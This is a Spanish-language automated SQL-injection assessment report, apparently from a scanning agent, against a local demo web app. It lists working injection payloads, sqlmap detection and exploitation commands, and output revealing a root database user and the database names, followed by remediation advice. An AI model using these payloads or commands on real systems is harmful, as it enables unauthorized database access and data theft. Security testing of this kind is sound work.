# Informe de análisis de inyección SQL

Fecha: 2026-04-13T11:04:11
Objetivo: http://web.dev.local:8083

---

## Resumen Ejecutivo

Se realizó un análisis automatizado DAST centrado en inyecciones SQL (SQLi) contra http://web.dev.local:8083. Se identificó y explotó una vulnerabilidad de SQLi en el parámetro GET `id` del formulario «User ID». El back-end es MySQL/MariaDB; se obtuvo el usuario actual y la lista de bases de datos.

---

## Vectores Analizados

- Formulario GET con parámetro `id` (input name="id") en la página principal.
- Petición probada: GET /?id=1

---

## Hallazgos

1) Vulnerabilidad detectada
- Parámetro: id (GET)
- Tipo(s) identificados por sqlmap: boolean-based blind, error-based, time-based blind, UNION query
- Payload de ejemplo (error-based):
  id=2352' AND EXTRACTVALUE(4611,CONCAT(0x5c,0x7176627171,(SELECT (ELT(4611=4611,1))),0x7171767871))-- EpGx&Submit=Submit
- Payload de ejemplo (boolean-based):
  id=2352' OR NOT 7247=7247#&Submit=Submit

2) Evidencia de explotación (sqlmap)
- Comando empleado (detección): sqlmap -u "http://web.dev.local:8083/?id=1" -p id --batch --level=3 --risk=2 --threads=2
- Comando empleado (explotación): sqlmap -u "http://web.dev.local:8083/?id=1" -p id --batch --current-user --dbs

- Resultado: sqlmap pudo recuperar el usuario actual y las bases de datos.
  - current user: 'root@%'
  - available databases:
    - information_schema
    - mysql
    - performance_schema
    - sqli_demo
    - sys

---

## Evidencia de Salida (fragmentos relevantes)

- sqlmap identificó el punto de inyección y tipos:

(Extractos)
Parameter: id (GET)
    Type: boolean-based blind
    Type: error-based
    Type: time-based blind
    Type: UNION query

- Usuario actual extraído:
  current user: 'root@%'

- Bases de datos listadas:
  information_schema, mysql, performance_schema, sqli_demo, sys

Los registros completos de sqlmap fueron guardados en el sistema y están disponibles bajo '/root/.local/share/sqlmap/output/web.dev.local' dentro del contenedor.

---

## Conclusión y recomendaciones

- Conclusión: El parámetro `id` es vulnerable a inyección SQL; la vulnerabilidad fue explotada con sqlmap para obtener el usuario de la base de datos y la lista de BDs. VULN_FOUND = true y VULN_EXPLOITED = true.

- Recomendaciones inmediatas:
  1. Desinfectar y validar estrictamente la entrada del parámetro `id` (usar prepared statements / consultas parametrizadas).
  2. Evitar el uso de privilegios de alto nivel (evitar root@% para la conexión de la aplicación).
  3. Implementar WAF/RLS y registros de auditoría para detectar inyecciones.
  4. Revisar las tablas en la BD `sqli_demo` y eliminar datos sensibles o moverlos a un almacén seguro.

---

## Archivos generados
- /tmp/scan/sqlmap_id.txt
- /tmp/scan/sqlmap_exploit.txt
- sqlmap output directory: /root/.local/share/sqlmap/output/web.dev.local


---

Fin del informe.
